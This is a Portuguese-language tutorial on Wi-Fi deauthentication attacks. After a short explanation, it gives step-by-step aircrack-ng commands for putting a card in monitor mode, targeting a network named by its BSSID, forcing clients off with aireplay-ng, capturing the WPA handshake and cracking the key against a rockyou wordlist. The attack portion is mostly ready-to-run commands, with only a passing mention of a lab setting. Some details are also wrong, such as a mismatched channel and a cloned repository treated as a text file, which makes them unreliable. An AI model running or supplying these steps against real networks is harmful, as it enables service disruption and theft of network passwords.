# 📁 Ataque de Deauth ou Dissociação de WI-FI

Redes cabeadas se autenticam com 3 Way Handshake, eqto redes de Wi-fi autenticam com 4 Way Handshake.

🛡️ Como funciona um ataque de desautenticação?

Os atacantes que desejam realizar um ataque de desautenticação geralmente usam dispositivos habilitados para Wi-Fi e software especializado. O processo básico envolve o seguinte:

    - Captura de tráfego Wi-Fi: O atacante inicia a captura de tráfego da rede Wi-Fi alvo usando ferramentas como um sniffer de pacotes.
    - Identificação de dispositivos-alvo: O atacante identifica os dispositivos que desejam desconectar da rede.
    - Envio de pacotes de desautenticação: Usando o endereço MAC dos dispositivos-alvo, o atacante envia pacotes de desautenticação, forçando os dispositivos a se desconectarem da rede.
    - Repetição contínua: O atacante pode repetir esse processo para manter os dispositivos desconectados da rede.

🎯 Objetivos de um ataque de desautenticação de Wi-Fi

Os atacantes realizam ataques de desautenticação de Wi-Fi por várias razões, incluindo:

    - Interrupção da conectividade: Desconectar dispositivos da rede pode causar interrupções significativas nas operações normais, afetando a produtividade e o acesso à Internet.
    - Espionagem: O ataque pode ser usado como uma tática para espionar o tráfego de rede dos dispositivos-alvo enquanto eles tentam se reconectar à rede.
    - Ameaças cibernéticas: Em alguns casos, os ataques de desautenticação podem ser o primeiro passo para invasões mais graves, como ataques de força bruta a senhas.


## Instala a ferramenta de monitoramento:

```bash
sudo apt install aircrack-ng
```

## Valida o nome da sua placa de rede wi-fi:

```bash
ip -c addr
```

## Valida possíveis conflitos de hardware antes de iniciar os processos:

```bash
sudo airmon-ng check kill
```

## Coloca a placa de rede wi-fi em modo monitoramento:

```bash
sudo airmon-ng start wlan0
```

## Valida o novo nome da sua placa de captura de redes wi-fi:

```bash
ip -c addr
```

```bash
sudo airmon-ng
```

## Inicia o scan de todas as redes próximas (aparecerão diversas redes):

```bash
sudo airodump-ng wlan0mon
```

## Encerra o scan das redes após escolher o alvo:

```bash
ctrl+c
```

## Anote o ESSID (Nome) da rede alvo, bem como o BSSID (MAC) e tbém o CANAL (CH):

```bash
Condominio_Flores_II
```

```bash
64:D1:54:09:EE:3E
```

```bash
4
```

## Podemos validar apenas a rede alvo, se preferir:

```bash
sudo airodump-ng wlan0mon -d 64:D1:54:09:EE:3E
```

## Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.

## Vai constar o novo cliente, com dados do aparelho, definidos em STATION.

**`TERMINAL 01`** - VAMOS INICIAR A CAPTURA DOS PACOTES

## Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:

```bash
sudo airodump-ng -w capturados -c 2 --bssid 64:D1:54:09:EE:3E wlan0mon
```
OU
```bash
sudo airodump-ng -w capturados --channel 2 --essid Condominio_Flores_II wlan0mon
```

Á partir daqui, eu aguardo algum dispositivo se conectar para realizar a captura do 4 Way Hand Shake.... OU

**`TERMINAL 02`** - VAMOS INICIAR O ATAQUE DE DESAUTENTICAÇÃO

## Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):

```bash
sudo aireplay-ng --deauth 0 -a 64:D1:54:09:EE:3E wlan0mon
```

Posso tbém, desautenticar apenas um dispositivo específico

```bash
sudo aireplay-ng --deauth 5 -a 64:D1:54:09:EE:3E -c 28:6C:07:6F:F9:53 wlan0mon
```

## Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:

```bash
[WPA handshake]: 64:D1:54:09:EE:3E
```

## Podemos encerrar a captura no TERMINAL 01

```bash
ctrl+c
```

## Podemos encerrar o ataque no TERMINAL 02

```bash
ctrl+c
```

## Até esse ponto apenas teríamos um ataque de Negação de serviço (DDOS), MAS, nós salvamos um arquivo com informações (capturados.cap) e vamos usá-lo

## Instale o Wireshark e abra o arquivo de captura, filtrando mensagens criptografadas, do tipo EAPOL:

```bash
sudo apt install wireshark
```

```bash
wireshark capturados.cap
```

OU

## Baixe sua wordlist para quebrar a senha capturada usando o aircrack-ng:

```bash
wget https://github.com/zacheller/rockyou.git
```

```bash
wc -l rockyou.txt
```

## Focaremos apenas em senhas que contenham de 8 a 64 caracteres, diminuindo o tempo de conjunções:

```bash
sudo grep -x '.\{8,64\}' rockyou.txt > wparockyou.txt
```

```bash
wc -l wparockyou.txt
```

```bash
aircrack-ng capturados.cap -w /home/usuariox/wordlists/rockyou.txt
```

## O resultado deve ser uma mensagem:

```bash
KEY FOUNF [ P@ssword123 ]
```

## Retira a placa de rede wi-fi do modo monitoramento:

```bash
airmon-ng stop wlan0mon
```

## Restaura sua placa de rede para navegação:

```bash
systemctl restart NetworkManager
```


## Alternativa de varredura de rede pelo terminal:
```bash
nmcli device wifi list 
```
```bash
N-USE = rede que você está usando
BSSID = endereço do roteador
SSID = nome da rede
MODE = infra (?)
CHAN = canal que está sendo utilizado pelo roteador
RATE = taxa de transferência
SIGNAL = intensidade do sinal em %
BARS = intensidade do sinal em barras
SECURITY = protocolos de segurança do roteador
```


